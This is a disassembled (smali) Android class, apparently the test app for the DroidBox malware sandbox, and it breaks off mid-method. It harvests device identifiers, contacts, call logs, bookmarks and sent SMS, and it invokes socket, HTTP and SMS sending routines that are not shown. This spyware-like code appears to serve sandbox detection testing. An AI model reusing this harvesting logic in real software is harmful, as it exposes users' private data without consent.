package droidbox.tests; class DroidBoxTests {/*

.class public Ldroidbox/tests/DroidBoxTests;
.super Landroid/app/Activity;
.source "DroidBoxTests.java"


# static fields
.field private static final KEY:[B = null

.field private static final KEY2:[B = null

.field private static final PREFS_NAME:Ljava/lang/String; = "Prefs"


# instance fields
.field private bookmark:Ljava/lang/String;

.field private calendar:Ljava/lang/String;

.field private calls:Ljava/lang/String;

.field private contactName:Ljava/lang/String;

.field private devicesn:Ljava/lang/String;

.field private encryptedImei:Ljava/lang/String;

.field private fileContent:Ljava/lang/String;

.field private hashedImei:Ljava/lang/String;

.field private iccd:Ljava/lang/String;

.field private imei:Ljava/lang/String;

.field private imsi:Ljava/lang/String;

.field private installedApps:Ljava/lang/String;

.field private msg:Ljava/lang/String;

.field private myPhone:Ljava/lang/String;

.field private number:Ljava/lang/String;

.field private phoneNbr:Ljava/lang/String;

.field private settings:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 8

    .prologue
    const/16 v7, 0x8

    #v7=(PosByte);
    const/4 v6, 0x7

    #v6=(PosByte);
    const/4 v5, 0x6

    #v5=(PosByte);
    const/4 v4, 0x4

    #v4=(PosByte);
    const/4 v3, 0x2

    .line 82
    #v3=(PosByte);
    const/16 v0, 0x10

    #v0=(PosByte);
    new-array v0, v0, [B

    #v0=(Reference);
    const/4 v1, 0x1

    #v1=(One);
    const/16 v2, 0x2a

    #v2=(PosByte);
    aput-byte v2, v0, v1

    aput-byte v3, v0, v3

    const/4 v1, 0x3

    #v1=(PosByte);
    const/16 v2, 0x36

    aput-byte v2, v0, v1

    aput-byte v4, v0, v4

    const/4 v1, 0x5

    const/16 v2, 0x2d

    aput-byte v2, v0, v1

    aput-byte v5, v0, v5

    aput-byte v6, v0, v6

    const/16 v1, 0x41

    aput-byte v1, v0, v7

    const/16 v1, 0x9

    const/16 v2, 0x9

    aput-byte v2, v0, v1

    const/16 v1, 0xa

    const/16 v2, 0x36

    aput-byte v2, v0, v1

    const/16 v1, 0xb

    const/16 v2, 0xb

    aput-byte v2, v0, v1

    const/16 v1, 0xc

    const/16 v2, 0xc

    aput-byte v2, v0, v1

    const/16 v1, 0xd

    const/16 v2, 0xd

    aput-byte v2, v0, v1

    const/16 v1, 0xe

    const/16 v2, 0x3c

    aput-byte v2, v0, v1

    const/16 v1, 0xf

    const/16 v2, 0xf

    aput-byte v2, v0, v1

    sput-object v0, Ldroidbox/tests/DroidBoxTests;->KEY:[B

    .line 83
    new-array v0, v7, [B

    const/4 v1, 0x1

    #v1=(One);
    const/16 v2, 0x2a

    aput-byte v2, v0, v1

    aput-byte v3, v0, v3

    const/4 v1, 0x3

    #v1=(PosByte);
    const/16 v2, 0x36

    aput-byte v2, v0, v1

    aput-byte v4, v0, v4

    const/4 v1, 0x5

    const/16 v2, 0x2d

    aput-byte v2, v0, v1

    aput-byte v5, v0, v5

    aput-byte v7, v0, v6

    sput-object v0, Ldroidbox/tests/DroidBoxTests;->KEY2:[B

    .line 73
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 73
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    #p0=(Reference);
    return-void
.end method

.method private toHex([B)Ljava/lang/String;
    .locals 5
    .parameter "buf"

    .prologue
    .line 556
    new-instance v1, Ljava/lang/StringBuffer;

    #v1=(UninitRef);
    invoke-direct {v1}, Ljava/lang/StringBuffer;-><init>()V

    .line 557
    .local v1, hexString:Ljava/lang/StringBuffer;
    #v1=(Reference);
    const/4 v2, 0x0

    .local v2, i:I
    :goto_0
    #v0=(Conflicted);v2=(Integer);v3=(Conflicted);v4=(Conflicted);
    array-length v3, p1

    #v3=(Integer);
    if-lt v2, v3, :cond_0

    .line 563
    invoke-virtual {v1}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v3

    #v3=(Reference);
    return-object v3

    .line 558
    :cond_0
    #v3=(Integer);
    aget-byte v3, p1, v2

    #v3=(Byte);
    and-int/lit16 v3, v3, 0xff

    #v3=(Integer);
    invoke-static {v3}, Ljava/lang/Integer;->toHexString(I)Ljava/lang/String;

    move-result-object v0

    .line 559
    .local v0, h:Ljava/lang/String;
    :goto_1
    #v0=(Reference);v3=(Conflicted);
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v3

    #v3=(Integer);
    const/4 v4, 0x2

    #v4=(PosByte);
    if-lt v3, v4, :cond_1

    .line 561
    invoke-virtual {v1, v0}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 557
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 560
    :cond_1
    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    const-string v4, "0"

    #v4=(Reference);
    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_1
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 3
    .parameter "savedInstanceState"

    .prologue
    .line 90
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 91
    const/high16 v1, 0x7f03

    #v1=(Integer);
    invoke-virtual {p0, v1}, Ldroidbox/tests/DroidBoxTests;->setContentView(I)V

    .line 92
    const-string v1, "http.keepAlive"

    #v1=(Reference);
    const-string v2, "true"

    #v2=(Reference);
    invoke-static {v1, v2}, Ljava/lang/System;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 94
    invoke-virtual {p0}, Ldroidbox/tests/DroidBoxTests;->setupTest()V

    .line 96
    invoke-virtual {p0}, Ldroidbox/tests/DroidBoxTests;->testSharedPreferences()V

    .line 98
    invoke-virtual {p0}, Ldroidbox/tests/DroidBoxTests;->testGetInstalledApps()V

    .line 99
    invoke-virtual {p0}, Ldroidbox/tests/DroidBoxTests;->testWriteFile()V

    .line 100
    invoke-virtual {p0}, Ldroidbox/tests/DroidBoxTests;->testReadFile()V

    .line 101
    new-instance v0, Landroid/content/Intent;

    #v0=(UninitRef);
    const-class v1, Ldroidbox/tests/SendDataService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 102
    .local v0, svc:Landroid/content/Intent;
    #v0=(Reference);
    invoke-virtual {p0, v0}, Ldroidbox/tests/DroidBoxTests;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 103
    invoke-virtual {p0}, Ldroidbox/tests/DroidBoxTests;->testCryptHash()V

    .line 104
    invoke-virtual {p0}, Ldroidbox/tests/DroidBoxTests;->testCryptAES()V

    .line 105
    invoke-virtual {p0}, Ldroidbox/tests/DroidBoxTests;->testCryptDES()V

    .line 106
    invoke-virtual {p0}, Ldroidbox/tests/DroidBoxTests;->testSendSocket()V

    .line 107
    invoke-virtual {p0}, Ldroidbox/tests/DroidBoxTests;->testSendDatagram()V

    .line 109
    invoke-virtual {p0}, Ldroidbox/tests/DroidBoxTests;->testNetworkHTTP()V

    .line 110
    invoke-virtual {p0}, Ldroidbox/tests/DroidBoxTests;->testSendSMS()V

    .line 112
    invoke-virtual {p0}, Ldroidbox/tests/DroidBoxTests;->testPhoneCall()V

    .line 113
    return-void
.end method

.method public onDestroy()V
    .locals 2

    .prologue
    .line 116
    new-instance v0, Landroid/content/Intent;

    #v0=(UninitRef);
    const-class v1, Ldroidbox/tests/SendDataService;

    #v1=(Reference);
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 117
    .local v0, svc:Landroid/content/Intent;
    #v0=(Reference);
    invoke-virtual {p0, v0}, Ldroidbox/tests/DroidBoxTests;->stopService(Landroid/content/Intent;)Z

    .line 119
    return-void
.end method

.method public setupTest()V
    .locals 27

    .prologue
    .line 126
    const-string v2, "phone"

    #v2=(Reference);
    move-object/from16 v0, p0

    #v0=(Reference);
    move-object v1, v2

    #v1=(Reference);
    invoke-virtual {v0, v1}, Ldroidbox/tests/DroidBoxTests;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v17

    #v17=(Reference);
    check-cast v17, Landroid/telephony/TelephonyManager;

    .line 129
    .local v17, manager:Landroid/telephony/TelephonyManager;
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v2

    move-object v0, v2

    move-object/from16 v1, p0

    iput-object v0, v1, Ldroidbox/tests/DroidBoxTests;->imei:Ljava/lang/String;

    .line 130
    move-object/from16 v0, p0

    iget-object v0, v0, Ldroidbox/tests/DroidBoxTests;->imei:Ljava/lang/String;

    move-object v2, v0

    move-object v0, v2

    move-object/from16 v1, p0

    iput-object v0, v1, Ldroidbox/tests/DroidBoxTests;->encryptedImei:Ljava/lang/String;

    .line 131
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v2

    move-object v0, v2

    move-object/from16 v1, p0

    iput-object v0, v1, Ldroidbox/tests/DroidBoxTests;->imsi:Ljava/lang/String;

    .line 132
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v20

    .line 133
    .local v20, operatorname:Ljava/lang/String;
    #v20=(Reference);
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v18

    .line 134
    .local v18, operatorcode:Ljava/lang/String;
    #v18=(Reference);
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getNetworkCountryIso()Ljava/lang/String;

    move-result-object v19

    .line 135
    .local v19, operatoriso:Ljava/lang/String;
    #v19=(Reference);
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v2

    move-object v0, v2

    move-object/from16 v1, p0

    iput-object v0, v1, Ldroidbox/tests/DroidBoxTests;->number:Ljava/lang/String;

    .line 136
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getSimCountryIso()Ljava/lang/String;

    move-result-object v21

    .line 137
    .local v21, simcountrycode:Ljava/lang/String;
    #v21=(Reference);
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getSimOperatorName()Ljava/lang/String;

    move-result-object v22

    .line 138
    .local v22, simoperator:Ljava/lang/String;
    #v22=(Reference);
    invoke-virtual/range {v17 .. v17}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v23

    .line 139
    .local v23, simserialno:Ljava/lang/String;
    #v23=(Reference);
    const-string v2, ""

    move-object v0, v2

    move-object/from16 v1, p0

    iput-object v0, v1, Ldroidbox/tests/DroidBoxTests;->fileContent:Ljava/lang/String;

    .line 141
    const-string v2, "Evasion"

    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    const-string v4, "BRAND: "

    #v4=(Reference);
    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    sget-object v4, Landroid/os/Build;->BRAND:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 142
    const-string v2, "Evasion"

    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    const-string v4, "DEVICE: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    sget-object v4, Landroid/os/Build;->DEVICE:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 143
    const-string v2, "Evasion"

    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    const-string v4, "MODEL: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    sget-object v4, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 144
    const-string v2, "Evasion"

    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    const-string v4, "PRODUCT: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    sget-object v4, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 145
    const-string v2, "Evasion"

    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    const-string v4, "IMEI: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    move-object/from16 v0, p0

    iget-object v0, v0, Ldroidbox/tests/DroidBoxTests;->imei:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 146
    const-string v2, "Evasion"

    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    const-string v4, "IMSI: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    move-object/from16 v0, p0

    iget-object v0, v0, Ldroidbox/tests/DroidBoxTests;->imsi:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 147
    const-string v2, "Evasion"

    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    const-string v4, "Operator name: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    move-object v0, v3

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 148
    const-string v2, "Evasion"

    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    const-string v4, "Operator code: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    move-object v0, v3

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 149
    const-string v2, "Evasion"

    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    const-string v4, "Operator iso: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    move-object v0, v3

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 150
    const-string v2, "Evasion"

    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    const-string v4, "SIM country code: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    move-object v0, v3

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 151
    const-string v2, "Evasion"

    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    const-string v4, "SIM operator: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    move-object v0, v3

    move-object/from16 v1, v22

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 152
    const-string v2, "Evasion"

    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    const-string v4, "SIM serial no: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    move-object v0, v3

    move-object/from16 v1, v23

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 153
    const-string v2, "Evasion"

    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    const-string v4, "Phone nbr: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    move-object/from16 v0, p0

    iget-object v0, v0, Ldroidbox/tests/DroidBoxTests;->number:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 157
    const/4 v2, 0x2

    #v2=(PosByte);
    new-array v4, v2, [Ljava/lang/String;

    const/4 v2, 0x0

    .line 158
    #v2=(Null);
    const-string v3, "title"

    aput-object v3, v4, v2

    const/4 v2, 0x1

    .line 159
    #v2=(One);
    const-string v3, "url"

    aput-object v3, v4, v2

    .line 161
    .local v4, projection:[Ljava/lang/String;
    sget-object v3, Landroid/provider/Browser;->BOOKMARKS_URI:Landroid/net/Uri;

    .line 162
    const/4 v5, 0x0

    #v5=(Null);
    const/4 v6, 0x0

    #v6=(Null);
    const/4 v7, 0x0

    #v7=(Null);
    move-object/from16 v2, p0

    .line 161
    #v2=(Reference);
    invoke-virtual/range {v2 .. v7}, Ldroidbox/tests/DroidBoxTests;->managedQuery(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v16

    .line 164
    .local v16, mCur:Landroid/database/Cursor;
    #v16=(Reference);
    invoke-interface/range {v16 .. v16}, Landroid/database/Cursor;->moveToFirst()Z

    .line 165
    const-string v2, "title"

    move-object/from16 v0, v16

    move-object v1, v2

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v25

    .line 166
    .local v25, titleIdx:I
    #v25=(Integer);
    const-string v2, "url"

    move-object/from16 v0, v16

    move-object v1, v2

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v26

    .line 167
    .local v26, urlIdx:I
    :goto_0
    #v26=(Integer);
    invoke-interface/range {v16 .. v16}, Landroid/database/Cursor;->isAfterLast()Z

    move-result v2

    #v2=(Boolean);
    if-eqz v2, :cond_0

    .line 173
    const/4 v2, 0x3

    #v2=(PosByte);
    new-array v4, v2, [Ljava/lang/String;

    .end local v4           #projection:[Ljava/lang/String;
    const/4 v2, 0x0

    .line 174
    #v2=(Null);
    const-string v3, "date"

    aput-object v3, v4, v2

    const/4 v2, 0x1

    .line 175
    #v2=(One);
    const-string v3, "number"

    aput-object v3, v4, v2

    const/4 v2, 0x2

    .line 176
    #v2=(PosByte);
    const-string v3, "duration"

    aput-object v3, v4, v2

    .line 178
    .restart local v4       #projection:[Ljava/lang/String;
    sget-object v3, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    .line 179
    const-string v5, "duration<?"

    .line 180
    #v5=(Reference);
    const/4 v2, 0x1

    #v2=(One);
    new-array v6, v2, [Ljava/lang/String;

    #v6=(Reference);
    const/4 v2, 0x0

    #v2=(Null);
    const-string v7, "60"

    #v7=(Reference);
    aput-object v7, v6, v2

    .line 181
    const-string v7, "duration ASC"

    move-object/from16 v2, p0

    .line 178
    #v2=(Reference);
    invoke-virtual/range {v2 .. v7}, Ldroidbox/tests/DroidBoxTests;->managedQuery(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v16

    .line 182
    invoke-interface/range {v16 .. v16}, Landroid/database/Cursor;->moveToFirst()Z

    .line 184
    :goto_1
    #v2=(Conflicted);v15=(Conflicted);
    invoke-interface/range {v16 .. v16}, Landroid/database/Cursor;->isAfterLast()Z

    move-result v2

    #v2=(Boolean);
    if-eqz v2, :cond_1

    .line 190
    invoke-virtual/range {p0 .. p0}, Ldroidbox/tests/DroidBoxTests;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    #v2=(Reference);
    const-string v3, "next_alarm_formatted"

    invoke-static {v2, v3}, Landroid/provider/Settings$System;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    move-object v0, v2

    move-object/from16 v1, p0

    iput-object v0, v1, Ldroidbox/tests/DroidBoxTests;->settings:Ljava/lang/String;

    .line 193
    const-string v24, "content://contacts/people"

    .line 194
    .local v24, strUri:Ljava/lang/String;
    #v24=(Reference);
    invoke-static/range {v24 .. v24}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v6

    .line 195
    .local v6, uricontact:Landroid/net/Uri;
    invoke-virtual/range {p0 .. p0}, Ldroidbox/tests/DroidBoxTests;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v5

    const/4 v7, 0x0

    #v7=(Null);
    const/4 v8, 0x0

    #v8=(Null);
    const/4 v9, 0x0

    #v9=(Null);
    const/4 v10, 0x0

    #v10=(Null);
    invoke-virtual/range {v5 .. v10}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v14

    .line 196
    .local v14, c:Landroid/database/Cursor;
    :goto_2
    #v14=(Reference);
    invoke-interface {v14}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    #v2=(Boolean);
    if-nez v2, :cond_3

    .line 202
    const-string v24, "content://sms/sent"

    .line 203
    invoke-static/range {v24 .. v24}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v8

    .line 204
    .local v8, urisms:Landroid/net/Uri;
    #v8=(Reference);
    invoke-virtual/range {p0 .. p0}, Ldroidbox/tests/DroidBoxTests;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v7

    #v7=(Reference);
    const/4 v9, 0x0

    const/4 v10, 0x0

    const/4 v11, 0x0

    #v11=(Null);
    const/4 v12, 0x0

    #v12=(Null);
    invoke-virtual/range {v7 .. v12}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v14

    .line 206
    :goto_3
    #v2=(Conflicted);v13=(Conflicted);
    invoke-interface {v14}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    #v2=(Boolean);
    if-nez v2, :cond_4

    .line 213
    return-void

    .line 168
    .end local v6           #uricontact:Landroid/net/Uri;
    .end local v8           #urisms:Landroid/net/Uri;
    .end local v14           #c:Landroid/database/Cursor;
    .end local v24           #strUri:Ljava/lang/String;
    :cond_0
    #v5=(Null);v6=(Null);v7=(Null);v8=(Uninit);v9=(Uninit);v10=(Uninit);v11=(Uninit);v12=(Uninit);v13=(Uninit);v14=(Uninit);v15=(Uninit);v24=(Uninit);
    move-object/from16 v0, v16

    move/from16 v1, v26

    #v1=(Integer);
    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    #v2=(Reference);
    move-object v0, v2

    move-object/from16 v1, p0

    #v1=(Reference);
    iput-object v0, v1, Ldroidbox/tests/DroidBoxTests;->bookmark:Ljava/lang/String;

    .line 169
    invoke-interface/range {v16 .. v16}, Landroid/database/Cursor;->moveToNext()Z

    goto/16 :goto_0

    .line 185
    :cond_1
    #v2=(Boolean);v5=(Reference);v6=(Reference);v7=(Reference);v15=(Conflicted);
    const/4 v15, 0x0

    .local v15, i:I
    :goto_4
    #v2=(Conflicted);v15=(Integer);
    invoke-interface/range {v16 .. v16}, Landroid/database/Cursor;->getColumnCount()I

    move-result v2

    #v2=(Integer);
    if-lt v15, v2, :cond_2

    .line 188
    invoke-interface/range {v16 .. v16}, Landroid/database/Cursor;->moveToNext()Z

    goto :goto_1

    .line 186
    :cond_2
    move-object/from16 v0, p0

    iget-object v0, v0, Ldroidbox/tests/DroidBoxTests;->calls:Ljava/lang/String;

    move-object v2, v0

    #v2=(Reference);
    new-instance v3, Ljava/lang/StringBuilder;

    #v3=(UninitRef);
    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v3, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v3=(Reference);
    move-object/from16 v0, v16

    move v1, v15

    #v1=(Integer);
    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object v0, v2

    move-object/from16 v1, p0

    #v1=(Reference);
    iput-object v0, v1, Ldroidbox/tests/DroidBoxTests;->calls:Ljava/lang/String;

    .line 185
    add-int/lit8 v15, v15, 0x1

    goto :goto_4

    .line 198
    .end local v15           #i:I
    .restart local v6       #uricontact:Landroid/net/Uri;
    .restart local v14       #c:Landroid/database/Cursor;
    .restart local v24       #strUri:Ljava/lang/String;
    :cond_3
    #v2=(Boolean);v7=(Null);v8=(Null);v9=(Null);v10=(Null);v14=(Reference);v15=(Conflicted);v24=(Reference);
    const/16 v2, 0x10

    #v2=(PosByte);
    invoke-interface {v14, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    #v2=(Reference);
    move-object v0, v2

    move-object/from16 v1, p0

    iput-object v0, v1, Ldroidbox/tests/DroidBoxTests;->contactName:Ljava/lang/String;

    goto :goto_2

    .line 208
    .restart local v8       #urisms:Landroid/net/Uri;
    :cond_4
    #v2=(Boolean);v7=(Reference);v8=(Reference);v11=(Null);v12=(Null);v13=(Conflicted);
    const/4 v2, 0x2

    #v2=(PosByte);
    invoke-interface {v14, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v13

    .line 209
    .local v13, addr:Ljava/lang/String;
    #v13=(Reference);
    move-object v0, v13

    move-object/from16 v1, p0

